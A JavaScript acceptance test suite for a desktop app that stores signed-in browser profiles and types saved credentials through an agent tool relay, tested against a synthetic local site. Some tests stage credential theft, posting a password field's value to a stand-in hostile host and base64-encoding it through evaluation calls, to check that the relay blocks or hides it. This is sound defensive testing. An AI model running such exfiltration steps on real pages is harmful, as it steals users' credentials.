/* global document, window, indexedDB, caches */
// MODULE: browser-accounts-live-suite.mjs - Isolated synthetic acceptance of profile variants, relay credentials and refresh.
import assert from 'node:assert/strict'
import { spawn } from 'node:child_process'
import { randomBytes } from 'node:crypto'
import { existsSync, readFileSync, readdirSync, statSync } from 'node:fs'
import { join, resolve } from 'node:path'
import { createInterface } from 'node:readline'
import { BrowserAccountsStore, atomicJson } from '../../apps/desktop/bin/browser-accounts-store.mjs'
import { AccountSignIn, checkProfile, openProfile } from '../../apps/desktop/bin/browser-accounts-engine.mjs'
import { AccountBrowserRelay, authenticatorCode } from '../../apps/desktop/bin/browser-account-relay.mjs'
import { replaceStartupPages } from '../../apps/desktop/bin/qa-browser-relay.mjs'
import { assertNoValues, isolatedMain, privateKeyring, recordProcess, result, stopProcess, syntheticSite } from './browser-accounts-fixture.mjs'

const phase = process.argv[2] || 'profiles', out = resolve(process.argv[3] || `.dev-auto/evidence/live-${phase}`)
isolatedMain(out)
recordProcess(process.pid, `97 synthetic ${phase} suite (loopback HTTP and Chrome)`)
const ring = await privateKeyring(), store = new BrowserAccountsStore(), signIn = new AccountSignIn(store)
let site, relays = [], contexts = [], leases = []
const workers = []
const checks = []
async function create(mode, name = mode, headless = true) {
  const { id } = await signIn.begin({ name, url: site.url(mode), headless })
  const { page } = signIn.sessions.get(id)
  if (!['email', 'public'].includes(mode)) {
    await page.locator('[name=user]').fill('synthetic')
    await page.locator('[name=password]').fill(site.password)
    const code = authenticatorCode(site.authenticator); site.values.push(code)
    await page.locator('[name=code]').fill(code)
    await page.getByRole('button', { name: 'Sign in' }).click()
    await page.getByRole('heading', { name: 'Signed in' }).waitFor()
  } else if (mode === 'email') {
    await page.locator('[name=user]').fill('synthetic')
    await page.getByRole('button', { name: 'Sign in' }).click()
    await page.getByRole('heading', { name: 'Signed in' }).waitFor()
  }
  if (mode === 'same') await signIn.sessions.get(id).context.newPage()
  const row = await signIn.finish(id)
  return row
}
async function browser(row) {
  const relay = new AccountBrowserRelay({ store, allowed: true }); relays.push(relay)
  const picked = await relay.tool('browser_account_pick', { name: row.name })
  assert(!picked.isError, 'account pick refused')
  return relay
}
async function signed(relay) { assert.equal(await relay.page().getByRole('heading', { name: 'Signed in' }).count(), 1, 'expected signed-in page') }
try {
  // Startup preflight waits for the private keyring, never the owner's bus.
  let preflight
  for (let attempt = 0; ; attempt++) {
    try { preflight = await store.create('keyring preflight', 'http://127.0.0.1:1'); break }
    catch (error) { if (attempt >= 30) throw error; await new Promise(ok => setTimeout(ok, 100)) }
  }
  {
      const meta = preflight, key = await store.key(meta.id), before = ring.state(meta.id)
      assert(before.items.length === 1, 'preflight sentinel item missing')
      assert(ring.lock(meta.id).locked, 'preflight did not lock')
      await assert.rejects(store.key(meta.id), error => error.code === 'KEYRING_LOCKED')
      const after = ring.unlock(meta.id)
      assert(!after.locked && after.owner === before.owner && JSON.stringify(after.items) === JSON.stringify(before.items), 'unlock changed service/item identity')
      assert((await store.key(meta.id)).equals(key), 'unlock lost sentinel')
      await store.remove(meta.id)
      checks.push('private keyring preflight: same daemon, collection and sentinel survive Lock/unlock')
  }
  site = await syntheticSite()
  if (phase === 'keyring') {
    checks.push('minimal unlock method preflight only; no browser started')
  } else if (phase === 'context-isolation') {
    const row = await create('same'), lease = await store.checkout(row.id); leases.push(lease)
    const saved = await openProfile(lease.profile); contexts.push(saved)
    const page = saved.pages()[0]; await page.goto(site.url('same'))
    const chrome = saved.browser(); assert(chrome, 'pinned persistent Chrome has no browser handle')
    const anonymous = await chrome.newContext({ viewport: { width: 1280, height: 720 }, acceptDownloads: false }); contexts.push(anonymous)
    const fresh = await anonymous.newPage(); await fresh.goto(site.url('same'))
    assert.equal(await fresh.locator('input[type=password]').count(), 1)
    assert(!(await anonymous.cookies()).some(cookie => cookie.name === 'session'), 'anonymous context inherited authenticated cookie')
    async function seed(page, tag) {
      await page.evaluate(async tag => {
        localStorage.setItem('isolation', tag)
        const db = await new Promise(ok => { const r = indexedDB.open('isolation', 1); r.onupgradeneeded = () => r.result.createObjectStore('marks'); r.onsuccess = () => ok(r.result) })
        await new Promise(ok => { const t = db.transaction('marks', 'readwrite'); t.objectStore('marks').put(tag, tag); t.oncomplete = ok }); db.close()
        await (await caches.open(tag)).put('/context-marker', new Response(tag))
        await navigator.serviceWorker.register('/same/' + tag + '-worker.js', { scope: '/same/' })
      }, tag)
    }
    async function marks(page) {
      return page.evaluate(async () => {
        const db = await new Promise(ok => { const r = indexedDB.open('isolation', 1); r.onupgradeneeded = () => r.result.createObjectStore('marks'); r.onsuccess = () => ok(r.result) })
        const keys = await new Promise(ok => { const r = db.transaction('marks').objectStore('marks').getAllKeys(); r.onsuccess = () => ok(r.result) }); db.close()
        return { local: localStorage.getItem('isolation'), keys, caches: await caches.keys(), workers: (await navigator.serviceWorker.getRegistrations()).map(r => r.active?.scriptURL || r.installing?.scriptURL || r.waiting?.scriptURL) }
      })
    }
    await seed(page, 'saved')
    const empty = await marks(fresh)
    assert.equal(empty.local, null); assert.deepEqual(empty.keys, []); assert.deepEqual(empty.caches, []); assert.deepEqual(empty.workers, [])
    await seed(fresh, 'anonymous')
    await anonymous.addCookies([{ name: 'anonymous-only', value: 'synthetic', url: site.origin }])
    const savedMarks = await marks(page), anonymousMarks = await marks(fresh)
    assert.equal(savedMarks.local, 'saved'); assert.deepEqual(savedMarks.keys, ['saved']); assert.deepEqual(savedMarks.caches, ['saved'])
    assert.equal(savedMarks.workers.length, 1)
    assert(savedMarks.workers.every(url => url.endsWith('/saved-worker.js')))
    assert.equal(anonymousMarks.local, 'anonymous'); assert.deepEqual(anonymousMarks.keys, ['anonymous']); assert.deepEqual(anonymousMarks.caches, ['anonymous'])
    assert.equal(anonymousMarks.workers.length, 1)
    assert(anonymousMarks.workers.every(url => url.endsWith('/anonymous-worker.js')))
    assert(!(await saved.cookies()).some(cookie => cookie.name === 'anonymous-only'))
    await anonymous.close()
    assert.equal(await page.getByRole('heading', { name: 'Signed in' }).count(), 1, 'closing anonymous context closed saved pages')
    await saved.close(); contexts = []
    assert(await store.publish(lease, { state: 'Signed in' })); store.discard(lease); leases = []
    const reopenedLease = await store.checkout(row.id); leases.push(reopenedLease)
    const reopened = await openProfile(reopenedLease.profile); contexts.push(reopened)
    const reopenedPage = reopened.pages()[0]; await reopenedPage.goto(site.url('same'))
    const retained = await marks(reopenedPage)
    assert.equal(retained.local, 'saved'); assert.deepEqual(retained.keys, ['saved']); assert.deepEqual(retained.caches, ['saved'])
    assert.equal(retained.workers.length, 1)
    assert(retained.workers.every(url => url.endsWith('/saved-worker.js')))
    assert(!(await reopened.cookies()).some(cookie => cookie.name === 'anonymous-only'))
    await reopened.close(); contexts = []; store.discard(reopenedLease); leases = []
    checks.push('pinned persistent Chrome supports independent anonymous context; bidirectional cookie/localStorage/IndexedDB/cache/service-worker isolation')
    checks.push('closing anonymous context preserves saved pages; anonymous mutations absent after saved-profile publication and reopen')
  } else if (phase === 'deferred-auth') {
    const row = await create('deferred')
    assert.equal(row.state, 'Signed in', 'asynchronous signed-out redirect was checked before the login form appeared')
    checks.push('Done confirms a durable dashboard when the anonymous SPA redirects after DOMContentLoaded')
    await store.setState(row.id, 'Not confirmed')
    const recovered = await browser(row)
    assert.equal(store.metadata(row.id).state, 'Signed in')
    await signed(recovered); await recovered.end(false)
    checks.push('actual account relay pick rechecks and confirms an existing unconfirmed saved profile')
    site.expire('deferred')
    const lease = await store.checkout(row.id); leases.push(lease)
    assert.equal(await checkProfile(store, lease, store.metadata(row.id)), false, 'expired profiles must not become confirmed during the SPA redirect')
    checks.push('the same delayed redirect with an expired saved session stays unconfirmed')
    store.discard(lease); leases = []
  } else if (phase === 'save-busy') {
    const first = await create('same')
    assert.equal(first.state, 'Signed in')
    checks.push('first account saved and confirmed')
    try {
      const second = await create('busy')
      assert.equal(second.state, 'Signed in', 'background traffic prevented saving the second account')
      const resumed = await browser(second)
      await signed(resumed)
      assert.equal(store.metadata(first.id).state, 'Signed in')
      checks.push('Done saves a second account whose signed-in page polls continuously; both accounts remain usable')
    } catch (error) {
      atomicJson(join(out, 'save-diagnostic.json'), { firstSaved: true, secondState: store.list().find(row => row.name.includes('busy'))?.state,
        errorName: error.name, errorCode: error.code ?? null, timedOutWaitingForNetworkIdle: error.name === 'TimeoutError' && error.message.includes('networkidle') })
      throw error
    }
  } else if (phase === 'normalization') {
    const row = await create('same')
    const overrideAt = process.argv.indexOf('--engine-source')
    const { openProfile: launch } = overrideAt >= 0
      ? await import(process.argv[overrideAt + 1]) : { openProfile }
    const seed = await store.checkout(row.id); leases.push(seed)
    const context = await launch(seed.profile); contexts.push(context)
    for (let n = 0; n < 3; n++) await context.newPage()
    assert(context.pages().length >= 4)
    await context.close(); contexts = []
    await store.publish(seed, { state: 'Signed in' }); store.discard(seed); leases = []
    for (let n = 0; n < 4; n++) {
      const lease = await store.checkout(row.id); leases.push(lease)
      const reopened = await launch(lease.profile); contexts.push(reopened)
      assert.equal(reopened.pages().length, 1, 'restored tabs accumulated before navigation')
      const page = reopened.pages()[0]; await page.goto(site.url('same'), { waitUntil: 'networkidle' })
      assert.equal(reopened.pages().length, 1, 'restored tabs appeared after navigation')
      assert.equal(await page.evaluate(() => globalThis.decryptToken()), site.indexed)
      const popupPromise = reopened.waitForEvent('page')
      await page.evaluate(() => { window.open('/same/app', 'synthetic-popup') })
      const popup = await popupPromise; await popup.getByRole('heading', { name: 'Signed in' }).waitFor()
      assert.equal(reopened.pages().length, 2, 'a later sign-in popup was closed')
      await popup.close(); await reopened.close(); contexts = []
      await store.publish(lease, { state: 'Signed in' }); store.discard(lease); leases = []
    }
    checks.push('multi-tab archive opens as one tab across four checkout/publish cycles; later real popups and working IndexedDB survive')
  } else if (phase === 'qa-restore') {
    // A QA browser opens before its audit routes exist: session cookies must survive, saved tabs must never reopen.
    const row = await create('same')
    for (let n = 0; n < 2; n++) {
      const lease = await store.checkout(row.id); leases.push(lease)
      const context = await openProfile(lease.profile, { qa: true }); contexts.push(context)
      assert.deepEqual(context.pages().map(page => page.url()), ['about:blank'], 'a saved tab reopened in a QA browser')
      const page = context.pages()[0]; await page.goto(site.url('same'))
      await page.getByRole('heading', { name: 'Signed in' }).waitFor({ timeout: 5000 })
      await context.close(); contexts = []
      await store.publish(lease, { state: 'Signed in' }); store.discard(lease); leases = []
    }
    const relay = new AccountBrowserRelay({ store, qa: true, allowed: true, beforeReady: replaceStartupPages }); relays.push(relay)
    const picked = await relay.tool('browser_account_pick', { name: row.name })
    assert.equal(JSON.parse(picked.content[0].text).state, 'Signed in', 'the QA relay pick lost the session-cookie sign-in')
    await signed(relay)
    checks.push('QA browser keeps a session-cookie sign-in across two checkout/publish cycles and reopens no saved tab; a QA relay pick replacing its startup tab stays signed in')
  } else if (phase === 'output-boundary') {
    const row = await create('same')
    await store.mark(row.id, { username: 'synthetic', password: site.password, authenticator: site.authenticator })
    site.expire('same')
    const relay = await browser(row)
    await relay.tool('browser_snapshot')
    assert(!(await relay.tool('browser_type', { target: '[name=password]', text: 'BMN_PASSWORD' })).isError)
    assertNoValues(join(relay.lease.folder, 'output'), [site.password])
    // Stand in for the trusted site's own console/error code, outside the agent tool gate.
    await relay.page().evaluate(() => console.log(document.querySelector('[name=password]').value))
    await relay.page().evaluate(() => {
      const value = document.querySelector('[name=password]').value
      console.error(value); console.log(btoa(value))
      setTimeout(() => { throw new Error(value) }, 0)
    })
    await relay.tool('browser_snapshot')
    await new Promise(ok => setTimeout(ok, 500))
    assertNoValues(join(relay.lease.folder, 'output'), [site.password, Buffer.from(site.password).toString('base64')])
    await relay.page().evaluate(async url => {
      await fetch(url, { method: 'POST', mode: 'no-cors', body: document.querySelector('[name=password]').value })
    }, site.hostile)
    await store.unmark(row.id)
    assert((await relay.tool('browser_evaluate', { function: '() => document.querySelector("[name=password]").value' })).isError, 'unmark dropped a secret-bearing origin restriction')
    await relay.page().goto(site.hostile)
    for (const name of ['browser_console_messages', 'browser_network_requests', 'browser_network_request'])
      assert((await relay.tool(name, { index: 1, part: 'request-body' })).isError, 'outside page exposed sign-in history')
    checks.push('console/log/error/pageerror raw and encoded output scans, cross-origin credential POST history and unmark retain the context privacy boundary')
  } else if (phase === 'lookup-races') {
    for (const action of ['unmark', 'remove']) {
      const row = await create('same', `lookup ${action}`)
      await store.mark(row.id, { username: 'synthetic', password: site.password, authenticator: site.authenticator })
      site.expire('same')
      const relay = await browser(row), page = relay.page(), original = store.keyring
      let reads = 0, reached, release
      const waiting = new Promise(ok => { reached = ok }), gate = new Promise(ok => { release = ok })
      store.keyring = async (...args) => {
        const value = await original(...args)
        if (args[0] === 'get' && args[2] === 'credentials' && ++reads === 2) { reached(); await gate }
        return value
      }
      try {
        const pending = relay.tool('browser_type', { target: '[name=password]', text: 'BMN_PASSWORD' })
        await waiting; await store[action](row.id); release()
        assert((await pending).isError, 'revoked in-flight lookup typed a credential')
        assert(page.isClosed() || await page.locator('[name=password]').inputValue() === '', 'a credential was typed after revocation')
      } finally { store.keyring = original; release(); await relay.end(false) }
    }
    checks.push('actual second Secret Service lookup paused across completed Unmark and Remove; nothing typed in either real page')
    const row = await create('same', 'shared lock entry')
    await store.mark(row.id, { username: 'synthetic', password: site.password, authenticator: site.authenticator })
    site.expire('same')
    const relay = await browser(row), originalLock = store.lock.bind(store), order = []
    let entered, release
    const waiting = new Promise(ok => { entered = ok }), gate = new Promise(ok => { release = ok })
    store.lock = (id, action, shared) => originalLock(id, async () => {
      if (shared && id === row.id) {
        entered(); await gate
        const result = await action(); order.push('entry'); return result
      }
      return await action()
    }, shared)
    try {
      const entry = relay.tool('browser_type', { target: '[name=password]', text: 'BMN_PASSWORD' })
      await waiting
      const revoked = store.unmark(row.id).then(() => { order.push('unmark') })
      release()
      assert(!(await entry).isError, 'already authorized entry did not finish under its shared lock')
      await revoked
      assert.deepEqual(order, ['entry', 'unmark'], 'completed revocation preceded in-flight entry')
      assert((await relay.tool('browser_type', { target: '[name=password]', text: 'BMN_PASSWORD' })).isError)
    } finally { store.lock = originalLock; release(); await relay.end(false) }
    checks.push('exclusive Unmark waits for shared-lock entry; every use after completed revocation is refused')
  } else if (phase === 'sign-in-races') {
    const row = await create('same')
    await Promise.all([signIn.begin({ id: row.id, headless: true }), signIn.begin({ id: row.id, headless: true })])
    assert.equal(store.claims().filter(lease => lease.id === row.id).length, 1, 'overlapping starts lost a browser lease')
    const previous = signIn.sessions.get(row.id)
    await signIn.finish(row.id, true)
    await signIn.begin({ id: row.id, headless: true })
    const current = signIn.sessions.get(row.id)
    previous.context.emit('close')
    await new Promise(ok => setTimeout(ok, 300))
    assert.equal(signIn.sessions.get(row.id), current, 'stale close callback finished a newer window')
    await signIn.finish(row.id, true)
    const meta = store.metadata(row.id)
    store.writeMeta({ ...meta, start: 'http://127.0.0.1:1/' })
    await assert.rejects(signIn.begin({ id: row.id, headless: true }))
    assert(!signIn.sessions.has(row.id), 'failed launch retained a sign-in reservation')
    assert.equal(store.claims().length, 0, 'failed launch leaked a lease')
    store.writeMeta(meta)
    await signIn.begin({ id: row.id, headless: true }); await signIn.finish(row.id, true)
    checks.push('overlapping actual sign-in starts share one window/lease; stale close cannot finish the next; navigation failure cleans and permits retry')
  } else if (phase === 'tab-authority') {
    const row = await create('same')
    await store.mark(row.id, { username: 'synthetic', password: site.password, authenticator: site.authenticator })
    site.expire('same')
    const relay = await browser(row)
    await relay.tool('browser_snapshot')
    const original = relay.page()
    assert(!(await relay.tool('browser_type', { target: '[name=password]', text: 'BMN_PASSWORD' })).isError)
    const popupPromise = relay.context.waitForEvent('page')
    await original.evaluate(url => { window.open(url, 'hostile-popup') }, site.hostile)
    const popup = await popupPromise; await popup.locator('[name=password]').waitFor()
    assert((await relay.tool('browser_evaluate', { function: '() => btoa(document.querySelector("[name=password]").value)' })).isError, 'popup bypassed selected-tab credential restriction')
    assert((await relay.tool('browser_console_messages')).isError, 'popup bypassed selected-tab history restriction')
    await relay.tool('browser_type', { target: '[name=user]', text: 'BMN_USERNAME' })
    await relay.tool('browser_account_code', { target: '[name=code]' })
    const context = relay.context
    assert(!(await relay.tool('browser_click', { target: 'button' })).isError)
    assert.notEqual(relay.context, context, 'outside popup prevented the completion restart')
    await signed(relay)
    assert(!JSON.stringify(await relay.tool('browser_console_messages')).includes('before-sign-in-history'))
    checks.push('real selected login tab remains protected across outside popup; self-sign-in restarts despite popup password field')
    await relay.page().goto(site.hostile)
    const outside = await relay.tool('browser_evaluate', { function: '() => 42' })
    assert(!outside.isError && JSON.stringify(outside).includes('42'), 'normal evaluation outside sign-in origins was lost')
    await relay.page().evaluate(url => { const frame = document.createElement('iframe'); frame.src = url; document.body.append(frame) }, site.url('same'))
    await relay.page().frameLocator('iframe').getByRole('heading', { name: 'Signed in' }).waitFor()
    const frameSnapshot = await relay.tool('browser_snapshot')
    const frameRef = /heading[^\n]*\[ref=(f\d+e\d+)\]/u.exec(frameSnapshot.content.map(c => c.text || '').join('\n'))?.[1]
    assert(frameRef, 'trusted-frame reference missing')
    assert((await relay.tool('browser_evaluate', { target: frameRef, function: 'element => element.textContent' })).isError, 'trusted iframe evaluation under outside top was allowed')
    checks.push('normal outside evaluation remains available; evaluation of a trusted iframe under an outside top is refused')
    const beforeTool = relay.policy.beforeTabTool
    relay.policy.beforeTabTool = async (name, page, args) => {
      await beforeTool(name, page, args)
      if (name === 'browser_evaluate') await page.goto(site.url('same'))
    }
    try {
      assert((await relay.tool('browser_evaluate', { function: '() => { globalThis.forbiddenEvaluation = true; return 42 }' })).isError, 'navigation between authorization and execution bypassed the origin guard')
      assert.equal(await relay.page().evaluate(() => globalThis.forbiddenEvaluation), undefined, 'supplied expression ran after navigation to trusted origin')
    } finally { relay.policy.beforeTabTool = beforeTool }
    await relay.page().goto(site.hostile)
    const neighbour = await relay.context.newPage()
    await neighbour.goto(site.url('same'))
    const closed = relay.page()
    relay.policy.beforeTabTool = async (name, page, args) => {
      await beforeTool(name, page, args)
      if (name === 'browser_evaluate') await page.close()
    }
    try {
      assert((await relay.tool('browser_evaluate', { function: '() => { globalThis.forbiddenEvaluation = true; return 42 }' })).isError, 'closed captured tab fell back to another page')
      assert(closed.isClosed())
      assert.equal(await neighbour.evaluate(() => globalThis.forbiddenEvaluation), undefined)
    } finally { relay.policy.beforeTabTool = beforeTool }
    assert((await relay.tool('browser_evaluate', { function: '() => 42' })).isError, 'replacement selected trusted tab escaped authorization')
    checks.push('navigation after host authorization and closure after vendor tab capture never run the supplied expression on a trusted replacement document/page')
  } else if (phase === 'writer-barrier') {
    const row = await create('same')
    const lease = await store.checkout(row.id); leases.push(lease)
    const context = await openProfile(lease.profile); contexts.push(context)
    await context.pages()[0].goto(site.url('same'))
    const anonymous = await context.browser().newContext({ acceptDownloads: false }); contexts.push(anonymous)
    const anonymousPage = await anonymous.newPage(); await anonymousPage.goto(site.url('same'))
    const records = readdirSync(join(store.runtime(), '.launches')).filter(name => name.endsWith('.json'))
      .map(name => JSON.parse(readFileSync(join(store.runtime(), '.launches', name), 'utf8')))
      .filter(record => record.folder === lease.folder)
    assert(records.some(record => record.init), 'test has no live namespace writer')
    const live = identity => {
      try {
        const stat = readFileSync(`/proc/${identity.pid}/stat`, 'utf8').split(') ')[1].split(' ')
        return stat[0] !== 'Z' && stat[19] === identity.ticks
      } catch { return false }
    }
    assert(records.some(record => live(record.init)), 'test writer exited before publication')
    // Do not trust context.close: publication itself owns the barrier even on forced-close paths.
    await store.publish(lease, { state: 'Signed in' }, { checkpoint: step => {
      if (step === 'encrypted') assert(records.every(record => ['init', 'monitor', 'launcher'].every(key => !record[key] || !live(record[key]))), 'archive encrypted before browser writers exited')
    } })
    await context.close(); contexts = []
    await assert.rejects(openProfile(lease.profile), 'sealed lease permitted a delayed browser launch')
    store.discard(lease); leases = []
    await assert.rejects(openProfile(lease.profile), 'discarded lease permitted a delayed browser launch')
    assert(!existsSync(lease.folder), 'late launch recreated an unclaimed runtime folder')
    checks.push('publish drains actual live Chrome namespace before encryption and rejects a delayed same-lease launch')
  } else if (phase === 'profiles') {
    for (const mode of ['same', 'cross', 'fetch', 'email', 'public', 'noncanonical', 'session']) {
      const row = await create(mode, mode, mode !== 'same')
      assert.equal(row.state, ['same', 'cross', 'fetch'].includes(mode) ? 'Signed in' : 'Not confirmed', `${mode} heuristic`)
      checks.push(`${mode}: ${row.state}`)
      if (mode === 'same') {
        const lease = await store.checkout(row.id); leases.push(lease)
        const context = await openProfile(lease.profile); contexts.push(context)
        const page = context.pages()[0]; await page.goto(site.url(mode))
        assert(await page.evaluate(() => localStorage.getItem('token')) === site.local, 'localStorage was not retained')
        assert(await page.evaluate(() => globalThis.decryptToken()) === site.indexed, 'IndexedDB CryptoKey was not retained')
        const cookies = await context.cookies(); assert(cookies.some(c => c.httpOnly && c.name === 'session'), 'HttpOnly cookie was not retained')
        await context.close(); contexts = []; store.discard(lease); leases = []
        checks.push('headed sign-in, cookie/localStorage/nonextractable IndexedDB retained')
      }
    }
    const second = await create('same', 'same, second account')
    assert.equal(store.list().filter(r => r.sites.includes(site.origin)).length, 8)
    await store.remove(second.id); assert(!store.list().some(r => r.id === second.id))
    const cancel = await signIn.begin({ name: 'cancelled', url: site.url('same'), headless: true })
    await signIn.finish(cancel.id, true); assert(!store.list().some(r => r.id === cancel.id))
    checks.push('same-site accounts separated; remove and Cancel erase their account')
    ring.lock()
    const id = store.find('same')
    await assert.rejects(store.checkout(id), error => error.code === 'KEYRING_LOCKED')
    assert.equal(store.metadata(id).state, 'Keyring locked')
    await assert.rejects(store.create('locked add', site.url('same')), error => error.code === 'KEYRING_LOCKED')
    ring.unlock()
    const relay = await browser({ name: 'same' }); await signed(relay); await relay.end()
    assert.equal(store.metadata(id).state, 'Signed in'); checks.push('real keyring Lock/add refusal/unlock without another sign-in')
  } else if (phase === 'credentials') {
    const row = await create('same')
    await store.mark(row.id, { username: 'synthetic', password: site.password, authenticator: site.authenticator })
    site.expire('same')
    const relay = await browser(row)
    assert.equal(store.metadata(row.id).state, 'Sign in again')
    const transcript = []
    const call = async (name, args) => { const answer = await relay.tool(name, args); transcript.push(answer); return answer }
    await call('browser_snapshot')
    assert(!(await call('browser_type', { target: '[name=user]', text: 'BMN_USERNAME' })).isError, 'username secret refused')
    assert(!(await call('browser_type', { target: '[name=password]', text: 'BMN_PASSWORD' })).isError, 'password secret refused')
    assert(!(await call('browser_account_code', { target: '[name=code]' })).isError, 'authenticator code refused')
    for (const name of ['browser_evaluate', 'browser_console_messages', 'browser_network_request', 'browser_run_code_unsafe']) assert((await call(name, { index: 1, function: '() => btoa(document.querySelector("[name=password]").value)' })).isError, 'sign-in tool restriction')
    assert(!(await call('browser_click', { target: 'button' })).isError, 'self sign-in submit failed')
    await signed(relay)
    const history = await call('browser_console_messages', {})
    assert(!JSON.stringify(history).includes('before-sign-in-history'), 'pre-sign-in console survived restart')
    assert.equal(store.metadata(row.id).state, 'Signed in')
    checks.push('real marked password+TOTP sign-in; limited tools and fresh-browser history boundary')
    // Change only the page the browser visits; the trusted-origin metadata remains unchanged.
    await relay.page().goto(site.hostile)
    assert((await call('browser_type', { target: '[name=password]', text: 'BMN_PASSWORD' })).isError)
    assert((await call('browser_account_code', { target: '[name=password]' })).isError)
    assert.equal(await relay.page().locator('[name=password]').inputValue(), '')
    checks.push('hostile top origin refuses secrets and code without typing')
    await relay.page().goto(site.url('same') + 'login')
    await relay.page().evaluate(url => { const f = document.createElement('iframe'); f.src = url; document.body.append(f) }, site.hostile)
    await relay.page().frameLocator('iframe').locator('[name=password]').waitFor()
    const frame = relay.page().frames().find(f => f !== relay.page().mainFrame())
    // Pinned MCP uses frame-qualified aria references for a cross-origin target.
    const snapshot = await call('browser_snapshot')
    const hostileRef = /textbox[^\n]*\[ref=(f\d+e\d+)\]/u.exec(snapshot.content.map(c => c.text || '').join('\n'))?.[1]
    assert(hostileRef, 'snapshot did not expose a real hostile-frame reference')
    assert((await call('browser_type', { target: hostileRef, text: 'BMN_PASSWORD' })).isError)
    assert.equal(await frame.locator('[name=password]').inputValue(), '')
    checks.push('injected hostile frame receives no secret')
    await store.unmark(row.id)
    assert((await call('browser_type', { target: '[name=password]', text: 'BMN_PASSWORD' })).isError)
    await store.mark(row.id, { username: 'synthetic', password: site.password, authenticator: site.authenticator })
    ring.lock()
    assert((await call('browser_account_code', { target: '[name=code]' })).isError)
    assert.equal(store.metadata(row.id).state, 'Keyring locked')
    ring.unlock()
    checks.push('unmark and actual locked keyring revoke the next secret in a running session')
    await relay.end(false)
    assert(!site.values.some(v => JSON.stringify(transcript).includes(v)), 'secret in MCP transcript')
    atomicJson(join(out, 'transcript.json'), transcript)
  } else if (phase === 'refresh') {
    const row = await create('same'), original = store.current(row.id)
    let relay = await browser(row)
    await relay.page().evaluate(() => fetch('renew', { method: 'POST' }))
    await relay.end(); assert.notEqual(store.current(row.id), original)
    relay = await browser(row); await signed(relay); await relay.end()
    checks.push('rotated session retained and usable on the next fresh copy')
    const a = await browser(row), b = await browser(row)
    await signed(a); await signed(b)
    await a.page().evaluate(() => fetch('renew', { method: 'POST' }))
    await b.page().evaluate(() => fetch('renew', { method: 'POST' }))
    await a.end(); await b.end()
    assert.equal(store.metadata(row.id).state, 'Sign in again')
    checks.push('parallel rotating-token reuse ends as Sign in again, never falsely signed in')
    await signIn.begin({ id: row.id, headless: true })
    const page = signIn.sessions.get(row.id).page
    await page.locator('[name=user]').fill('synthetic'); await page.locator('[name=password]').fill(site.password); await page.locator('[name=code]').fill(authenticatorCode(site.authenticator))
    await page.getByRole('button', { name: 'Sign in' }).click(); await page.getByRole('heading', { name: 'Signed in' }).waitFor()
    await signIn.finish(row.id); assert.equal(store.metadata(row.id).state, 'Signed in')
    relay = await browser(row)
    const folder = relay.lease.folder
    await store.remove(row.id)
    await new Promise(ok => setTimeout(ok, 800))
    assert((await relay.tool('browser_snapshot')).isError)
    assert(!readdirSync(store.runtime()).some(name => join(store.runtime(), name) === folder))
    checks.push('reopen fixes sign-in; removal closes the running session and wipes its copy')
  } else if (phase === 'latency') {
    const row = await create('same'), plain = [], account = [], tabs = []
    for (let n = 0; n < 5; n++) {
      const relay = new AccountBrowserRelay({ store, allowed: true }); relays.push(relay)
      let start = performance.now(); await relay.start(); plain.push(performance.now() - start); await relay.end()
      start = performance.now(); await relay.pick(row.name); account.push(performance.now() - start)
      tabs.push(relay.context.pages().length); assert.equal(tabs.at(-1), 1, 'account startup restored extra tabs')
      await relay.end()
    }
    const median = a => a.toSorted((a, b) => a - b)[2], added = median(account) - median(plain)
    atomicJson(join(out, 'timings.json'), { plain, account, addedMedianMs: added, tabs })
    assert(added <= 3000, 'account startup added more than 3 seconds (median of five)')
    checks.push('account pick adds at most 3 s (median of five; timings.json)')
  } else if (phase === 'privacy') {
    const row = await create('same'), a = await browser(row), b = await browser(row)
    await signed(a); await signed(b)
    assert.notEqual(a.lease.folder, b.lease.folder)
    checks.push('two real pinned MCP sessions use independent signed-in copies of the same non-rotating account')
    await a.page().evaluate(() => globalThis.api())
    const index = a.requests.findIndex(request => request.url().endsWith('/same/api')) + 1
    assert(index > 0, 'authenticated API request was not captured')
    const transcript = []
    for (const part of [undefined, 'request-headers', 'response-headers', 'request-body', 'response-body']) {
      const answer = await a.tool('browser_network_request', { index, ...(part ? { part } : {}) })
      if (part?.endsWith('body')) assert(answer.isError, 'sign-in-origin body exposed')
      else assert(!answer.isError, 'sanitized headers unavailable')
      transcript.push(answer)
    }
    const filename = join(out, 'must-not-exist.txt')
    assert((await a.tool('browser_network_request', { index, filename })).isError)
    assert(!existsSync(filename), 'network tool wrote a requested file')
    const serialized = JSON.stringify(transcript)
    assert(!site.values.some(value => serialized.includes(value)), 'raw credential returned in network result')
    atomicJson(join(out, 'network-transcript.json'), transcript)
    assertNoValues(join(a.lease.folder, 'output'), site.values)
    let processCount = 0
    const scanProcess = pid => {
      for (const name of ['cmdline', 'environ']) {
        const bytes = readFileSync(`/proc/${pid}/${name}`)
        assert(!site.values.some(value => bytes.includes(Buffer.from(value))), 'synthetic credential in process arguments/environment')
      }
      processCount++
      for (const child of readFileSync(`/proc/${pid}/task/${pid}/children`, 'utf8').trim().split(/\s+/u).filter(Boolean)) {
        try { scanProcess(child) } catch (error) { if (error.code !== 'ENOENT' && error.code !== 'ESRCH') throw error }
      }
    }
    scanProcess(process.pid)
    checks.push(`network headers filtered, sign-in bodies and filenames refused; transcript/output and ${processCount} process argument/environment scans clean`)
    await a.end(false); await b.end(false)
  } else if (phase === 'crash' || phase === 'crash-relay') {
    const row = await create('same')
    async function worker(step, proof) {
      const child = spawn(process.execPath, [resolve('scripts/test/browser-account-crash-worker.mjs')], { stdio: ['pipe', 'pipe', 'pipe'] })
      const identity = recordProcess(child.pid, `97 disposable ${step} crash worker`)
      const lines = createInterface({ input: child.stdout }), closed = new Promise(ok => child.once('close', ok))
      const ready = new Promise((ok, no) => {
        const timer = setTimeout(() => no(new Error('Crash worker did not reach checkpoint')), 30_000)
        lines.once('line', line => { clearTimeout(timer); ok(JSON.parse(line)) })
        child.once('close', () => { clearTimeout(timer); no(new Error('Crash worker exited before checkpoint')) })
      })
      child.stdin.write(JSON.stringify({ id: row.id, step, proof }) + '\n')
      try { const w = { child, identity, lines, closed, ready: await ready }; workers.push(w); return w }
      catch (error) { stopProcess(identity, 'SIGKILL'); await closed; throw error }
    }
    if (phase === 'crash') {
    for (const step of ['restored', 'encrypted', 'version', 'link', 'current']) {
      const proof = randomBytes(24).toString('hex'), before = store.current(row.id), w = await worker(step, proof)
      assert.equal(w.ready.checkpoint, step)
      if (step === 'restored') assert(w.ready.claimed, 'plaintext restoration preceded its recoverable claim')
